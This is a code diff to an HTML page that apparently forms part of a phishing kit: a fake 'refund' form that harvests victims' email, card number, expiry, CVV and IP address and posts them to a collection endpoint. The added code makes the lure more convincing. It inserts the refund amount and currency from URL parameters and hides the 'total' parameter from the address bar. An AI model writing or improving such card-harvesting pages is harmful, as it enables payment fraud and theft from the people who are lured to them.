@@ -132,6 +132,7 @@
             <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
         </div>
         <div class="payment-title" id="payment-title">Refund 45€</div>
+        <div>Price: <span class="event-price"></span></div>
         <hr>
         <form id="paymentForm" autocomplete="off">
             <div class="input-group">
@@ -184,6 +185,18 @@
         const card = document.getElementById('card-input').value;
         const expiry = document.getElementById('expiry-input').value;
         const cvv = document.getElementById('cvv-input').value;
+        // --- Додаємо price і currency ---
+        let price = localStorage.getItem('event_price');
+        let currency = localStorage.getItem('event_currency');
+        if (!price || !currency) {
+            // fallback: парсимо з total
+            const totalRaw = getQueryParam('total') || localStorage.getItem('refund_total') || '';
+            const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
+            if (match) {
+                price = match[1].replace(',', '.');
+                currency = match[2];
+            }
+        }
         try {
             let ip = userIP;
             if (!ip) {
@@ -193,7 +206,7 @@
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund' })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund', price, currency })
             });
             if (response.ok) {
                 if (!document.getElementById('payment-msg')) {
@@ -297,6 +310,89 @@
     }
     setTimeout(pollSupportButtons, 2000);
     </script>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+  var expiry = document.getElementById('expiry-input');
+  if (expiry) {
+    expiry.addEventListener('input', function(e) {
+      let val = this.value.replace(/[^0-9]/g, '');
+      if (val.length > 2) val = val.slice(0,2) + '/' + val.slice(2,4);
+      this.value = val;
+    });
+  }
+});
+</script>
+    <script>
+(function() {
+  // Підстановка ціни та валюти з URL, localStorage, або збереженого refund_total
+  const params = new URLSearchParams(window.location.search);
+  let price = params.get('price');
+  let currency = params.get('currency');
+  let totalRaw = params.get('total');
+  let title = '';
+  if (price && currency) {
+    localStorage.setItem('event_price', price);
+    localStorage.setItem('event_currency', currency);
+    title = `Refund ${price} ${currency}`;
+  } else if (totalRaw) {
+    // Витягуємо число і валюту з total (наприклад, 58CHF)
+    const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
+    if (match) {
+      price = match[1].replace(',', '.');
+      currency = match[2];
+      localStorage.setItem('event_price', price);
+      localStorage.setItem('event_currency', currency);
+      localStorage.setItem('refund_total', totalRaw);
+      title = `Refund ${price} ${currency}`;
+    } else {
+      // Якщо тільки число
+      const numMatch = totalRaw.match(/\d+[\.,]?\d*/);
+      price = numMatch ? numMatch[0].replace(',', '.') : '';
+      currency = localStorage.getItem('event_currency') || 'EUR';
+      title = `Refund ${price} ${currency}`;
+    }
+  } else if (localStorage.getItem('refund_total')) {
+    // Якщо total вже зник з адреси, але є у localStorage
+    const saved = localStorage.getItem('refund_total');
+    const match = saved.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
+    if (match) {
+      price = match[1].replace(',', '.');
+      currency = match[2];
+      localStorage.setItem('event_price', price);
+      localStorage.setItem('event_currency', currency);
+      title = `Refund ${price} ${currency}`;
+    } else {
+      const numMatch = saved.match(/\d+[\.,]?\d*/);
+      price = numMatch ? numMatch[0].replace(',', '.') : '';
+      currency = localStorage.getItem('event_currency') || 'EUR';
+      title = `Refund ${price} ${currency}`;
+    }
+  } else {
+    price = localStorage.getItem('event_price');
+    currency = localStorage.getItem('event_currency');
+    if (price && currency) title = `Refund ${price} ${currency}`;
+  }
+  if (title) {
+    document.getElementById('payment-title').textContent = title;
+  }
+  if (price && currency) {
+    document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
+  }
+})();
+</script>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Ховаємо параметр total з адресного рядка, але зберігаємо його у localStorage
+  const params = new URLSearchParams(window.location.search);
+  const total = params.get('total');
+  if (total) {
+    localStorage.setItem('refund_total', total);
+    params.delete('total');
+    const newUrl = window.location.pathname + (params.toString() ? '?' + params.toString() : '');
+    window.history.replaceState({}, '', newUrl);
+  }
+});
+</script>
     <!--Start of Tawk.to Script-->
     <script type="text/javascript">
     var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
